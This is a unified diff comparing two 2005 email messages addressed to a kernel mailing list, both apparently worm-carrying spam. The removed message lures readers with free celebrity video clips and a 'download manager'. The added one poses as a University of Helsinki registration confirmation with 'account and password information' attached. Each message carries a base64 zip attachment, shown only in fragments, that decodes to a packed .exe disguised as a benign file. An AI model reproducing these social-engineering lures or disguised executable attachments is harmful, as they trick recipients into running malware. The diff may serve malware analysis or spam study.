@@ -1,30 +1,29 @@
-From: info@jagunet.com
-Subject: Paris_Hilton_&_Nicole_Richie
-Date: Fri, 23 Dec 2005 03:18:14 UTC
-Message-ID: <477d62f268ccbbfd775@jagunet.com>
+From: info@helsinki.fi
+Subject: Registration Confirmation
+Date: Fri, 23 Dec 2005 03:38:02 UTC
+Message-ID: <3eb14f.3c681182fec@helsinki.fi>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===41f2f2a2d81f0d01cbe9b"
+Content-Type: multipart/mixed; boundary="0aeece2d3b.bc"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: majordomo@oss.sgi.com
+To: ralf@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---===41f2f2a2d81f0d01cbe9b
+--0aeece2d3b.bc
 
-The Simple Life:
+Account and Password Information are attached!
 
-View Paris Hilton & Nicole Richie video clips , pictures & more ;)
-Download is free until Jan, 2006!
 
-Please use our Download manager.
---===41f2f2a2d81f0d01cbe9b
-Content-Type: application/octet-stream; name=downloadm.zip
+***** Go to: http://www.helsinki.fi
+***** Email: postman@helsinki.fi
+--0aeece2d3b.bc
+Content-Type: application/octet-stream; name=reg_pass.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="downloadm.zip"
+Content-Disposition: attachment; filename="reg_pass.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1001,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---===41f2f2a2d81f0d01cbe9b--
+--0aeece2d3b.bc--
